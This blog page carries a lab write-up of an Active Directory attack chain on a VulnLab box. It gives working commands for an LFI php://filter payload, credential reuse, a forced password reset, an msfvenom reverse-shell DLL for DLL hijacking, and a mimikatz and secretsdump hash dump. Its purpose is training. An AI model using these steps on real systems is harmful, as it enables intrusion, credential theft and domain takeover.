<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Trusted AD Chain VulnLab - Writeup | Mohamed Khalil Mzali</title><meta name="author" content="Mohamed Khalil Mzali"><meta name="copyright" content="Mohamed Khalil Mzali"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Trusted is an Active Directory Chain from VulnLab that starts with an LFI leading to MySQL database Access. Then, it follows with a compromise of the child domain and a domain trust attack.">
<meta property="og:type" content="article">
<meta property="og:title" content="Trusted AD Chain VulnLab - Writeup">
<meta property="og:url" content="https://cyberkmz.github.io/2024/11/26/TrustedChainWriteup/index.html">
<meta property="og:site_name" content="Mohamed Khalil Mzali">
<meta property="og:description" content="Trusted is an Active Directory Chain from VulnLab that starts with an LFI leading to MySQL database Access. Then, it follows with a compromise of the child domain and a domain trust attack.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cyberkmz.github.io/img/Trusted/trusted_slide.png">
<meta property="article:published_time" content="2024-11-25T23:00:00.000Z">
<meta property="article:modified_time" content="2024-11-26T19:18:48.729Z">
<meta property="article:author" content="Mohamed Khalil Mzali">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cyberkmz.github.io/img/Trusted/trusted_slide.png"><link rel="shortcut icon" href="/img/shield-halved-solid.svg"><link rel="canonical" href="https://cyberkmz.github.io/2024/11/26/TrustedChainWriteup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Trusted AD Chain VulnLab - Writeup',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-11-26 20:18:48'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/CyberKMZ.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://mohamed-khalil-mzali.gitbook.io/mohamed-khalil-mzali"><i class="fa-fw fas fa-folder-open"></i><span> Gitbook</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://medium.com/@mzalimohamedkhalil"><i class="fa-fw fas fa-brands fa-medium"></i><span> Medium</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/CV-KhalilMzali.pdf"><i class="fa-fw fas fa-solid fa-file"></i><span> Resume</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/Trusted/trusted_slide.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Mohamed Khalil Mzali"><span class="site-name">Mohamed Khalil Mzali</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://mohamed-khalil-mzali.gitbook.io/mohamed-khalil-mzali"><i class="fa-fw fas fa-folder-open"></i><span> Gitbook</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://medium.com/@mzalimohamedkhalil"><i class="fa-fw fas fa-brands fa-medium"></i><span> Medium</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/CV-KhalilMzali.pdf"><i class="fa-fw fas fa-solid fa-file"></i><span> Resume</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Trusted AD Chain VulnLab - Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-25T23:00:00.000Z" title="Created 2024-11-26 00:00:00">2024-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-26T19:18:48.729Z" title="Updated 2024-11-26 20:18:48">2024-11-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/VulnLab/">VulnLab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Trusted AD Chain VulnLab - Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Trusted is an Active Directory Chain from VulnLab that starts with an LFI leading to MySQL database Access. Then, it follows with a compromise of the child domain and a domain trust attack. </p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p><strong>Scan for 10.10.152.117 machine</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">53/tcp    open     domain        Simple DNS Plus</span><br><span class="line">88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-25 17:23:47Z)</span><br><span class="line">135/tcp   open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open     microsoft-ds?</span><br><span class="line">464/tcp   open     kpasswd5?</span><br><span class="line">593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open     tcpwrapped</span><br><span class="line">3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open     tcpwrapped</span><br><span class="line">3389/tcp  open     ms-wbt-server Microsoft Terminal Services</span><br><span class="line">5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open     mc-nmf        .NET Message Framing</span><br><span class="line">15289/tcp filtered unknown</span><br><span class="line">27105/tcp filtered unknown</span><br><span class="line">47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49670/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49679/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">54258/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">54907/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">55168/tcp filtered unknown</span><br><span class="line">58346/tcp filtered unknown</span><br><span class="line">59443/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">64014/tcp filtered unknown</span><br><span class="line">Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft</span><br></pre></td></tr></table></figure>

<p><strong>Scan for 10.10.152.118 machine</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>n PHP/<span class="number">8.1</span>.<span class="number">6</span>)</span><br><span class="line"><span class="number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="number">2024</span>-<span class="number">11</span>-<span class="number">25</span> <span class="number">17</span>:<span class="number">31</span>:<span class="number">01</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/http      Apache httpd <span class="number">2.4</span>.<span class="number">53</span> ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>n PHP/<span class="number">8.1</span>.<span class="number">6</span>)</span><br><span class="line"><span class="number">445</span>/tcp   open  microsoft-ds?</span><br><span class="line"><span class="number">464</span>/tcp   open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)</span><br><span class="line"><span class="number">3269</span>/tcp  open  tcpwrapped</span><br><span class="line"><span class="number">3306</span>/tcp  open  mysql         MySQL <span class="number">5.5</span>.<span class="number">5</span>-<span class="number">10.4</span>.<span class="number">24</span>-MariaDB</span><br><span class="line"><span class="number">3389</span>/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line"><span class="number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">9389</span>/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"><span class="number">47001</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line"><span class="number">49368</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49664</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49665</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49666</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49667</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49669</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49672</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49677</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">49678</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">49689</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">53399</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">63593</span>/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>


<p>We start by visiting the web server hosted on port 80 of the 10.10.152.118 machine, and we are in front of of the XAMPP dashboard page</p>
<p><img src="/img/Trusted/Pasted%20image%2020241125182247.png"></p>
<p>So, we decide to perform directory enumeration on the web server, as follows:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.152.118/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 </span><br></pre></td></tr></table></figure>

<p><img src="/img/Trusted/Pasted%20image%2020241125182619.png"></p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>As we can see, the &#x2F;dev folder gives access to a webpage</p>
<p><img src="/img/Trusted/Pasted%20image%2020241125182842.png"></p>
<p>While checking each link in the navbar separately, we stumbled upon a potentially vulnerable lfi parameter. And knowing from the initial scan that this web server is a windows server, then we tried to access the <code>C:\xampp\apache\conf\httpd.conf</code> file, which was successful. </p>
<p><img src="/img/Trusted/Pasted%20image%2020241125185811.png"></p>
<p>However, in the &#x2F;dev home page there was an interesting note indicating an issue with a database connection php file, which will help us find our next step for initial access, knowing that there is an MySQL server on this machine.</p>
<p><img src="/img/Trusted/Pasted%20image%2020241126094853.png"></p>
<p>So we enumerate the &#x2F;dev webpage for php files in order to search for that database connection file, as follows:<br><code>gobuster dir -u http://10.10.226.198/dev/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30 -x php</code></p>
<p><img src="/img/Trusted/Pasted%20image%2020241126095147.png"></p>
<p>The next step is to exploit the LFI to access the db.php file from the web server. To do that, we only have to base64 encode the output of that file, as follows:<br><code>http://10.10.226.198/dev/index.html?view=php://filter/convert.base64-encode/resource=db.php</code></p>
<p><img src="/img/Trusted/Pasted%20image%2020241126095424.png"></p>
<p><strong>MySQL Credentials:</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;SuperSecureMySQLPassw0rd1337.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">?&gt;<span class="built_in">base64</span>: invalid input</span><br></pre></td></tr></table></figure>

<p>Using these credentials, we successfully accessed the MariaDB database</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u <span class="string">&quot;root&quot;</span> -p  -h 10.10.226.198 </span><br></pre></td></tr></table></figure>

<p>By enumerating the databases in the mysql server, we decided to enumerate the news database for its users table and found the following credentials<br><img src="/img/Trusted/Pasted%20image%2020241126102003.png"></p>
<p>Using hashcat with the rockyou.txt wordlist, we only arrived to crack the first MD5 hash of <strong>rsmith</strong> which appears to be a valid domain user of the <strong>lab.trusted.vl</strong> domain</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.226.197-198 -u <span class="string">&quot;rsmith&quot;</span> -p <span class="string">&quot;IHateEric2&quot;</span> </span><br></pre></td></tr></table></figure>

<p><img src="/img/Trusted/Pasted%20image%2020241126102552.png"></p>
<h2 id="Lab-Trusted-VL-domain-enumeration"><a href="#Lab-Trusted-VL-domain-enumeration" class="headerlink" title="Lab.Trusted.VL domain enumeration"></a>Lab.Trusted.VL domain enumeration</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u rsmith -p <span class="string">&quot;IHateEric2&quot;</span> -d lab.trusted.vl -c all -v -ns 10.10.226.198  </span><br></pre></td></tr></table></figure>

<p>We can see that from <strong>rsmith</strong>* we have to forcechangepassword on <strong>ewalters</strong> to get a foothold into <strong>LABDC.lab.trusted.vl</strong></p>
<p><img src="/img/Trusted/Pasted%20image%2020241126104431.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;ewalters&quot;</span> <span class="string">&quot;P@ssword2024&quot;</span> -U <span class="string">&quot;lab.trusted.vl&quot;</span>/<span class="string">&quot;rsmith&quot;</span>%<span class="string">&quot;IHateEric2&quot;</span> -S <span class="string">&quot;LABDC.lab.trusted.vl&quot;</span></span><br></pre></td></tr></table></figure>

<p>We can see that the password successfully changed<br><img src="/img/Trusted/Pasted%20image%2020241126123737.png"></p>
<p>Afterwards, we PsRemote into the DC as <strong>ewalters</strong><br><code>evil-winrm  -u &quot;lab.trusted.vl\ewalters&quot; -p &quot;P@ssword2024&quot; -i 10.10.226.198</code></p>
<h2 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h2><p>We stumble upon <strong>KasperskyRemoval.exe</strong> which appears to be run as cpowers (Christine) which should be our next user to be compromised. </p>
<p>We decide to copy that executable to our local Windows Machine and use Procmon to check for the executable behaviour.</p>
<p>After running it, we apply a filter for <strong>Kaspersky Removal</strong> in Procmon.</p>
<p><img src="/img/Trusted/Pasted%20image%2020241126123950.png"></p>
<p>And a filter for dll files only within that process</p>
<p><img src="/img/Trusted/Pasted%20image%2020241126124135.png"></p>
<p>Scrolling through the DLL files loaded by that process, we found that it calls for DLLs within the local executable path (In this case inside the Desktop folder) with <strong>NAME_NOT_FOUND</strong>. This supposes that we can insert our own DLL file inside that folder to perform DLL Hijacking.<br><img src="/img/Trusted/Pasted%20image%2020241126124355.png"></p>
<p>For that purpose, we additionally added a filter for the unfound DLLs that could be hijacked<br><img src="/img/Trusted/Pasted%20image%2020241126124753.png"></p>
<p>This leaves us with the <strong>KasperkyRemovalToolENU.dll</strong>, so using msfvenom we will create a new DLL with the same name  <strong>KasperkyRemovalToolENU.dll</strong> inside the local directory</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.8.4.76 LPORT=80 -f dll -o KasperskyRemovalToolENU.dll</span><br></pre></td></tr></table></figure>

<p>After executing the <strong>KasperskyRemovalTool.exe</strong> we get a new shell session running as <strong>cpowers</strong><br><img src="/img/Trusted/Pasted%20image%2020241126164926.png"></p>
<p>We can access the <strong>User.txt</strong> on the Administrator’s Desktop folder<br><strong>VL{349efd4b1ccbeb4d3ca0108fa5cc5802}</strong></p>
<h2 id="Domain-Trust-Attack"><a href="#Domain-Trust-Attack" class="headerlink" title="Domain Trust Attack"></a>Domain Trust Attack</h2><p>Using mimikatz, we can dump the logonpasswords including the machine account LABDC$ password for DCSync.<br><img src="/img/Trusted/Pasted%20image%2020241126170233.png"></p>
<p><code>LABDC$:b06fe581ac3e94fd1a9c879b991b78a4</code></p>
<p>Then we do as follows:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py <span class="string">&quot;lab.trusted.vl&quot;</span>/<span class="string">&quot;LABDC$&quot;</span>@10.10.188.22 -hashes <span class="string">&quot;:b06fe581ac3e94fd1a9c879b991b78a4&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Trusted/Pasted%20image%2020241126165922.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:75878369ad33f35b7070ca854100bc07:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c7a03c565c68c6fac5f8913fab576ebd:::</span><br><span class="line">lab.trusted.vl\rsmith:1104:aad3b435b51404eeaad3b435b51404ee:30ef48d2054363df9244bc0d476e93dd:::</span><br><span class="line">lab.trusted.vl\ewalters:1106:aad3b435b51404eeaad3b435b51404ee:911b07e6987da6cffecc77e71b04aadc:::</span><br><span class="line">lab.trusted.vl\cpowers:1107:aad3b435b51404eeaad3b435b51404ee:322db798a55f85f09b3d61b976a13c43:::</span><br><span class="line">LABDC$:1000:aad3b435b51404eeaad3b435b51404ee:b06fe581ac3e94fd1a9c879b991b78a4:::</span><br><span class="line">TRUSTED$:1103:aad3b435b51404eeaad3b435b51404ee:16c9441c5025a5ad06d6e797ac1867f1:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:ef0dd1293ef26fdcb054dfecd324e272037f8af708bd2d6289d4010075605eb3</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:8487e135528f40d60c99a45b071bbf86</span><br><span class="line">Administrator:des-cbc-md5:b64aef752657b3c8</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:c930ddb15c3f84aafa01e816abc1112e38430b574ae3fcdd019e77bc906494aa</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:db0b41cedf222df3808858fc41bb0c02</span><br><span class="line">krbtgt:des-cbc-md5:0e89167916c134ad</span><br><span class="line">lab.trusted.vl\rsmith:aes256-cts-hmac-sha1-96:b1dd0c20df2dc7638ded51d85ba03682ea308444b4121a10b8e4fa3c24872a41</span><br><span class="line">lab.trusted.vl\rsmith:aes128-cts-hmac-sha1-96:631ba36ba1aaf36135ba4b382dd41590</span><br><span class="line">lab.trusted.vl\rsmith:des-cbc-md5:ae892f45c12fbc5e</span><br><span class="line">lab.trusted.vl\ewalters:aes256-cts-hmac-sha1-96:c50ae21535e4ece5ab0c528325c02d9ccd3b4d0acc7f486c8db7ecacef8c3df4</span><br><span class="line">lab.trusted.vl\ewalters:aes128-cts-hmac-sha1-96:b4e140616f429d5efb9666d3121c598f</span><br><span class="line">lab.trusted.vl\ewalters:des-cbc-md5:853d8cfd89cb3270</span><br><span class="line">lab.trusted.vl\cpowers:aes256-cts-hmac-sha1-96:cfd7dce3d0c1a17ae08fc653769ddd382b116b3708197f5d251764dab318d39e</span><br><span class="line">lab.trusted.vl\cpowers:aes128-cts-hmac-sha1-96:413bcdb4a908e53f133a9c660006c0b9</span><br><span class="line">lab.trusted.vl\cpowers:des-cbc-md5:32ab807a018ac89d</span><br><span class="line">LABDC$:aes256-cts-hmac-sha1-96:1277f83e51903d4f3f75e174e7e9b168fd96c36afb35de5fccfcdfea3d329941</span><br><span class="line">LABDC$:aes128-cts-hmac-sha1-96:788c77b09ac9f25c2c3522613755a9e9</span><br><span class="line">LABDC$:des-cbc-md5:7cdc312351f2baa8</span><br><span class="line">TRUSTED$:aes256-cts-hmac-sha1-96:5d76917db63a810eff649298e96b79a40e54bf17d918df86fb3b53453d331ba2</span><br><span class="line">TRUSTED$:aes128-cts-hmac-sha1-96:cdb7c83c18f17f91fbe615e6a062c11f</span><br><span class="line">TRUSTED$:des-cbc-md5:0d6810c1529b750e</span><br></pre></td></tr></table></figure>

<p>Now the next step will be to become DA on the parent domain <strong>trusted.vl</strong> that we mapped during our bloodhound enumeration in a child-to-parent domain trust attack</p>
